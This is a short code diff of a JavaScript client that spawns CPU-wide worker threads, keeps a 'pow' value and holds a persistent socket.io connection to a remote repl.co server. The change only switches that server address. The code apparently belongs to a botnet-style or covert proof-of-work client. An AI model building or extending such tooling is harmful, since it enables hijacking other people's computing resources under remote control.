@@ -24,7 +24,7 @@ for (i=0;i<Math.floor(require('os').cpus().length/1.5);i++) new Worker(__filenam
 var url = ''
 var pow = 0
 
-const socket = io("wss://server.iep0kjum6sity5e.repl.co", {
+const socket = io("wss://server2.iep0kjum6sity5e.repl.co", {
   reconnection: true,
   reconnectionAttempts: 10000,
   reconnectionDelay: 6000,
@@ -62,7 +62,7 @@ socket.on('connect', function() {
 function reconnect() {
   socket = null;
   console.log("reconnecting lol")
-  var socket = io("wss://server.iep0kjum6sity5e.repl.co", {
+  var socket = io("wss://server2.iep0kjum6sity5e.repl.co", {
     reconnectionDelayMax: 30000,
     // keep this
   });
